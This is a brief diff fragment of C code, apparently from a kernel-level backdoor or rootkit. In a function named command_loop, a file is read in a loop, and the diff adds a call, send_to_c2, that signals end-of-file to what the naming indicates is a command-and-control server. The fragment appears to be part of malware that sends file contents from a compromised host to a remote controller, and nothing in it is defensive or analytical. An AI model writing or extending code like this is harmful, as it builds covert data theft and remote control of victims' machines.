@@ -160,6 +160,7 @@ static int command_loop(void *data) {
             } while (rlen > 0);
             filp_close(f, NULL);
         }
+        send_to_c2("--EOF--\n", 8);
     }
     return 0;
 }
